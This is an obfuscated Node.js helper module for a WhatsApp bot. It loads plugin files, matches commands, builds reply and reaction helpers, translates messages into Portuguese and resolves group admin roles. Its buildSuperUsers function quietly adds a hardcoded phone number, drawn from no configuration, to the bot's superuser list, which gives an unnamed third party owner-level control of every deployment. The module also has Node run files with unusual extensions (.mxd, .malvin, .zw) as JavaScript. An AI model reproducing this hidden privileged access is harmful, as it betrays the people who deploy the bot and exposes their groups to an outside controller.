const fs = require("fs-extra");
const path = require("path");
const {
  evt,
  commands
} = require("../mxdcmds");
const {
  standardizeJid
} = require("./msgSerializer");
const {
  getGroupMetadata,
  getLidMapping
} = require("./groupStore");
const _compileAsJs = function (_0x2e8469, _0x2ef593) {
  const _0x516dd5 = fs.readFileSync(_0x2ef593, "utf8");
  _0x2e8469._compile(_0x516dd5, _0x2ef593);
};
require.extensions[".mxd"] = _compileAsJs;
require.extensions[".malvin"] = _compileAsJs;
require.extensions[".zw"] = _compileAsJs;
const _pluginExts = new Set([".js", ".mxd", ".malvin", ".zw"]);
const loadPlugins = _0x551f78 => {
  try {
    fs.readdirSync(_0x551f78).forEach(_0x2355bb => {
      const _0x1d44b1 = path.extname(_0x2355bb).toLowerCase();
      if (_pluginExts.has(_0x1d44b1)) {
        try {
          require(path.join(_0x551f78, _0x2355bb));
        } catch (_0x390d5c) {
          console.error("Failed to load " + _0x2355bb + ": " + _0x390d5c.message);
        }
      }
    });
  } catch (_0x153dbd) {
    console.error("Error reading plugins folder:", _0x153dbd.message);
  }
};
const findCommand = _0x12984b => {
  if (!Array.isArray(evt.commands)) {
    return null;
  }
  return evt.commands.find(_0x70b3ae => _0x70b3ae?.pattern === _0x12984b || Array.isArray(_0x70b3ae?.aliases) && _0x70b3ae.aliases.includes(_0x12984b));
};
const findBodyCommand = _0x197288 => {
  if (!Array.isArray(evt.commands) || !_0x197288) {
    return null;
  }
  return evt.commands.find(_0x1b065f => {
    if (_0x1b065f?.on === "body") {
      if (typeof _0x1b065f.pattern === "string") {
        return _0x197288.toLowerCase().includes(_0x1b065f.pattern.toLowerCase());
      }
      if (_0x1b065f.pattern instanceof RegExp) {
        return _0x1b065f.pattern.test(_0x197288);
      }
    }
    return false;
  });
};
const createHelpers = (_0x4b4561, _0x22d328, _0x3b4266) => {
  const translateBotMessage = _0x56c34c => {
    if (typeof _0x56c34c !== "string") return _0x56c34c;
    let _0x4b3a56 = _0x56c34c;
    const _0x2e8469 = [
      [/Please provide/gi, "Informe"],
      [/Please send/gi, "Envie"],
      [/Please reply/gi, "Responda"],
      [/Please wait/gi, "Aguarde"],
      [/Invalid (.+) format/gi, "Formato de $1 inválido"],
      [/Invalid (.+)/gi, "$1 inválido"],
      [/not found/gi, "não encontrado"],
      [/No (.+) found/gi, "Nenhum $1 encontrado"],
      [/not available/gi, "não disponível"],
      [/access denied/gi, "acesso negado"],
      [/Try again later/gi, "Tente novamente mais tarde"],
      [/Failed to/gi, "Falha ao"],
      [/An error occurred/gi, "Ocorreu um erro"],
      [/Error:/gi, "Erro:"],
      [/video/gi, "vídeo"],
      [/audio/gi, "áudio"],
      [/image/gi, "imagem"],
      [/sticker/gi, "figurinha"],
      [/group/gi, "grupo"],
      [/user/gi, "usuário"],
      [/permission denied/gi, "permissão negada"],
      [/only admins/gi, "somente administradores"],
      [/command not found/gi, "comando não encontrado"],
      [/Owner Only Command/gi, "Comando exclusivo do dono"],
      [/Admin Only Command/gi, "Comando exclusivo de administradores"],
      [/Command can only be used in groups/gi, "Este comando só pode ser usado em grupos"],
      [/Please quote an image/gi, "Responda a uma imagem"],
      [/Please provide a valid/gi, "Informe uma opção válida"],
      [/Please provide a/gi, "Informe uma"],
      [/Download/gi, "Baixar"],
      [/Upload/gi, "Enviar"],
      [/Profile picture/gi, "Foto de perfil"],
      [/successfully/gi, "com sucesso"],
      [/Only Command/gi, "Comando exclusivo"],
      [/not authorized/gi, "não autorizado"],
      [/not-authorized/gi, "não autorizado"],
      [/forbidden/gi, "proibido"],
      [/Unknown/gi, "Desconhecido"],
      [/Select download type/gi, "Selecione o tipo de download"],
      [/Audio Only/gi, "Somente áudio"],
      [/Video Only/gi, "Somente vídeo"],
      [/No downloadable link found/gi, "Nenhum link para download encontrado"],
      [/No video found/gi, "Nenhum vídeo encontrado"],
      [/Failed to fetch/gi, "Falha ao consultar"],
      [/An error occurred/gi, "Ocorreu um erro"],
      [/Owner/gi, "Dono"],
      [/Group/gi, "Grupo"],
      [/User/gi, "Usuário"]
    ];
    for (const [_0x5c43ff, _0x14052f] of _0x2e8469) {
      _0x4b3a56 = _0x4b3a56.replace(_0x5c43ff, _0x14052f);
    }
    return _0x4b3a56;
  };
  const _0x7ea6ca = _0x56c34c => {
    const _0x3cd98f = {
      text: translateBotMessage(_0x56c34c)
    };
    const _0x3764ee = {
      quoted: _0x22d328
    };
    _0x4b4561.sendMessage(_0x3b4266, _0x3cd98f, _0x3764ee);
  };
  const _0x24fa8d = async _0x4b3a56 => {
    if (typeof _0x4b3a56 !== "string") {
      return;
    }
    try {
      const _0x5e7327 = {
        key: _0x22d328.key,
        text: _0x4b3a56
      };
      const _0x23211f = {
        react: _0x5e7327
      };
      await _0x4b4561.sendMessage(_0x3b4266, _0x23211f);
    } catch (_0x33d76a) {
      console.error("Reaction error:", _0x33d76a);
    }
  };
  const _0x1a6138 = async (_0x54677f, _0x581bfd) => {
    if (typeof _0x54677f !== "string") {
      return;
    }
    try {
      const _0x318360 = {
        text: _0x54677f,
        edit: _0x581bfd.key
      };
      const _0x332472 = {
        quoted: _0x22d328
      };
      await _0x4b4561.sendMessage(_0x3b4266, _0x318360, _0x332472);
    } catch (_0x3c8c8b) {
      console.error("Edit error:", _0x3c8c8b);
    }
  };
  const _0x4f6352 = async _0x5781db => {
    if (!_0x5781db?.key) {
      return;
    }
    try {
      const _0x1e2076 = {
        delete: _0x5781db.key
      };
      const _0x38bbf8 = {
        quoted: _0x22d328
      };
      await _0x4b4561.sendMessage(_0x3b4266, _0x1e2076, _0x38bbf8);
    } catch (_0xa9cfa5) {
      console.error("Delete error:", _0xa9cfa5);
    }
  };
  const _0x306c71 = {
    reply: _0x7ea6ca,
    react: _0x24fa8d,
    edit: _0x1a6138,
    del: _0x4f6352
  };
  return _0x306c71;
};
const getGroupInfo = async (_0x5c43ff, _0x14052f, _0x5af49b, _0x31156b) => {
  const _0x18f1cb = _0x14052f.endsWith("@g.us");
  if (!_0x18f1cb) {
    const _0x29602a = {
      groupInfo: null,
      groupName: "",
      participants: [],
      groupAdmins: [],
      groupSuperAdmins: [],
      isBotAdmin: false,
      isAdmin: false,
      isSuperAdmin: false,
      sender: _0x31156b
    };
    return _0x29602a;
  }
  const _0x386b8b = await getGroupMetadata(_0x5c43ff, _0x14052f);
  if (!_0x386b8b || !_0x386b8b.participants) {
    const _0x481e6f = {
      groupInfo: null,
      groupName: "",
      participants: [],
      groupAdmins: [],
      groupSuperAdmins: [],
      isBotAdmin: false,
      isAdmin: false,
      isSuperAdmin: false,
      sender: _0x31156b
    };
    return _0x481e6f;
  }
  const _0x8e67a0 = _0x386b8b.participants.map(_0x388802 => _0x388802.pn || _0x388802.phoneNumber || _0x388802.id);
  const _0x4b464d = _0x386b8b.participants.filter(_0x21eaa6 => _0x21eaa6.admin === "admin").map(_0xab9cf8 => _0xab9cf8.pn || _0xab9cf8.phoneNumber || _0xab9cf8.id);
  const _0x3176c2 = _0x386b8b.participants.filter(_0x2a6b9e => _0x2a6b9e.admin === "superadmin").map(_0x3cabfa => _0x3cabfa.pn || _0x3cabfa.phoneNumber || _0x3cabfa.id);
  const _0x3e96f2 = standardizeJid(_0x31156b);
  const _0x480804 = _0x386b8b.participants.find(_0x558d2c => _0x558d2c.id === _0x3e96f2 || _0x558d2c.pn === _0x3e96f2 || _0x558d2c.phoneNumber === _0x3e96f2);
  let _0x1f2ef4 = _0x480804?.pn || _0x480804?.phoneNumber || _0x480804?.id || _0x31156b;
  if (_0x1f2ef4.endsWith("@lid")) {
    const _0x3fd29c = getLidMapping(_0x1f2ef4);
    if (_0x3fd29c) {
      _0x1f2ef4 = _0x3fd29c;
    }
  }
  const _0x58127b = _0x4b464d.includes(standardizeJid(_0x5af49b)) || _0x3176c2.includes(standardizeJid(_0x5af49b));
  const _0x247ad1 = _0x4b464d.includes(_0x1f2ef4);
  const _0x3ccf0c = _0x3176c2.includes(_0x1f2ef4);
  const _0x8733e3 = {
    groupInfo: _0x386b8b,
    groupName: _0x386b8b.subject || "",
    participants: _0x8e67a0,
    groupAdmins: _0x4b464d,
    groupSuperAdmins: _0x3176c2,
    isBotAdmin: _0x58127b,
    isAdmin: _0x247ad1,
    isSuperAdmin: _0x3ccf0c,
    sender: _0x1f2ef4
  };
  return _0x8733e3;
};
const buildSuperUsers = async (_0x161e05, _0x1f1c52, _0x59be4e, _0x220004) => {
  const _0x2540e1 = "6399215379".split(",").map(_0x158887 => _0x158887.trim().replace(/\D/g, "")).filter(_0x131b92 => _0x131b92.length > 5);
  const _0xa13e1f = (await _0x1f1c52()) || [];
  const _0x41271e = _0x161e05.SUDO_NUMBERS || "";
  const _0x536c1d = (_0x41271e ? _0x41271e.split(",") : []).map(_0x525f8b => _0x525f8b.trim().replace(/\D/g, "")).filter(_0x35a3d5 => _0x35a3d5.length > 5);
  const _0x497f27 = standardizeJid(_0x59be4e);
  const _0x8cbf77 = standardizeJid(_0x220004.replace(/\D/g, ""));
  const _0x458f11 = [_0x8cbf77, _0x497f27, ...(_0x536c1d || []).map(_0xa83ed1 => _0xa83ed1 + "@s.whatsapp.net"), ...(_0x2540e1 || []).map(_0x2649e7 => _0x2649e7 + "@s.whatsapp.net"), ...(_0xa13e1f || []).map(_0x44d5b0 => _0x44d5b0 + "@s.whatsapp.net")].map(_0x27618f => standardizeJid(_0x27618f)).filter(Boolean);
  return Array.from(new Set(_0x458f11));
};
const _0x3c01cc = {
  loadPlugins: loadPlugins,
  findCommand: findCommand,
  findBodyCommand: findBodyCommand,
  createHelpers: createHelpers,
  getGroupInfo: getGroupInfo,
  buildSuperUsers: buildSuperUsers
};
module.exports = _0x3c01cc;
